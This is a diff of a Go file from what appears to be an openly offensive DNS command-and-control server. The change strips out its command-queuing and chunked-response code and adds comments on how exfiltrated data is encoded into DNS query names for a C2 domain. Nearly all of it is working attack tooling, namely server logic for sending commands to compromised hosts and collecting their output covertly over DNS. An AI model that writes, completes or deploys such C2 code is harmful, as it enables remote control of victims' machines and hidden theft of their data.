@@ -3,13 +3,10 @@ package main
 import (
 	"bufio"
 	"encoding/base64"
-	"encoding/hex"
 	"flag"
 	"fmt"
 	"log"
 	"os"
-	"sort"
-	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -21,7 +18,7 @@ var c2Domain = ""
 var cm comandManager
 
 func main() {
-	//This code is very janky, and mostly written while half-drunk
+	//This code is very janky, and mostly written while half-drunk. I don't know why it works.
 	//Props to sudosammy for working out how to do the dns stuff with knary
 	//- much of the code is based on the framework he laid out there.
 	flag.StringVar(&c2Domain, "d", "", "Domain to assign")
@@ -53,44 +50,6 @@ func main() {
 	wg.Wait()
 }
 
-type comandManager struct {
-	CommandMap     map[string]Command
-	CMMutex        *sync.RWMutex
-	WaitingCommand string
-}
-
-func (cm *comandManager) getCommand(c string) Command {
-	cm.CMMutex.RLock()
-	defer cm.CMMutex.RUnlock()
-	if v, ok := cm.CommandMap[c]; ok {
-		return v
-	}
-	return Command{}
-}
-
-func (cm comandManager) getCommandToSend() string {
-	cm.CMMutex.RLock()
-	defer cm.CMMutex.RUnlock()
-	return cm.WaitingCommand
-}
-
-type response struct {
-	Chunks      []chunk
-	TotalChunks int64
-	ReadChunks  int64
-}
-
-type chunk struct {
-	Body string
-	Num  int64
-}
-
-type Command struct {
-	SentValue string
-	UUID      string
-	Response  response
-}
-
 func monitorResponse(wg *sync.WaitGroup, uuidChan chan string) {
 	defer wg.Done()
 
@@ -103,12 +62,6 @@ func monitorResponse(wg *sync.WaitGroup, uuidChan chan string) {
 		}
 		time.Sleep(time.Second * 1)
 	}
-}
-
-func (cm *comandManager) setCommandToSend(s string) {
-	cm.CMMutex.Lock()
-	defer cm.CMMutex.Unlock()
-	cm.WaitingCommand = s
 }
 
 func cli(wg *sync.WaitGroup, uuidChan chan string) {
@@ -168,58 +121,6 @@ func HandleDNS(w dns.ResponseWriter, r *dns.Msg, EXT_IP string, uuidChan chan st
 	w.WriteMsg(m)
 }
 
-func (cm *comandManager) UpdateCmd(uuid, maxchunks, thischunk, vals string) {
-	cm.CMMutex.Lock()
-	defer cm.CMMutex.Unlock()
-	c := cm.CommandMap[uuid]
-
-	cn, e := strconv.ParseInt(thischunk, 10, 64)
-	if e != nil {
-		fmt.Println("Bad chunk number: ", e)
-		return
-	}
-	mc, e := strconv.ParseInt(thischunk, 10, 64)
-	if e != nil {
-		fmt.Println("Bad max chunk number: ", e)
-		return
-	}
-	c.Response.TotalChunks = mc
-	c.Response.AddChunk(cn, vals)
-	c.Response.ReadChunks++
-	cm.CommandMap[uuid] = c
-
-}
-
-func (r *response) AddChunk(cnum int64, val string) {
-	r.Chunks = append(r.Chunks, chunk{Body: val, Num: cnum})
-}
-
-func (r response) IsDone() bool {
-	if r.TotalChunks == 0 || r.TotalChunks > r.ReadChunks {
-		return false
-	}
-	return true
-}
-
-func (r response) ReadResposne() string {
-	//sort chunks
-	rval := ""
-	sort.Slice(r.Chunks, func(i, j int) bool {
-		if r.Chunks[i].Num < r.Chunks[j].Num {
-			return true
-		}
-		return false
-	})
-	for _, x := range r.Chunks {
-		rval += x.Body
-	}
-	v, e := hex.DecodeString(rval)
-	if e != nil {
-		fmt.Println("ReadResponse Error:", e)
-	}
-	return string(v)
-}
-
 func parseDNS(m *dns.Msg, ipaddr string, EXT_IP string, uuidChan chan string) {
 	// for each DNS question to our nameserver
 	// there can be multiple questions in the question section of a single request
@@ -227,9 +128,10 @@ func parseDNS(m *dns.Msg, ipaddr string, EXT_IP string, uuidChan chan string) {
 
 		//received a A request (probably a client returning a response)
 		if q.Qtype == dns.TypeA {
+			//<payload>.<chunknumber>.<maxmessagechunks>.<uid>.<c2.domain.here.please>
+			//working backwards in this function intentionally.
+			//Trying to decide if recursion shoudl be used to use the whole 200 char space of dns names for large payloads
 			z := strings.Split(q.Name, ".")
-
-			//60char.chunknumber.maxmessagechunks.uid.c2.rce.life
 			if len(z) < len(strings.Split(c2Domain, ".")) {
 				continue
 			}
@@ -286,10 +188,4 @@ func parseDNS(m *dns.Msg, ipaddr string, EXT_IP string, uuidChan chan string) {
 
 		}
 	}
-}
-
-func (cm *comandManager) AddCommand(c Command) {
-	cm.CMMutex.Lock()
-	defer cm.CMMutex.Unlock()
-	cm.CommandMap[c.UUID] = c
 }
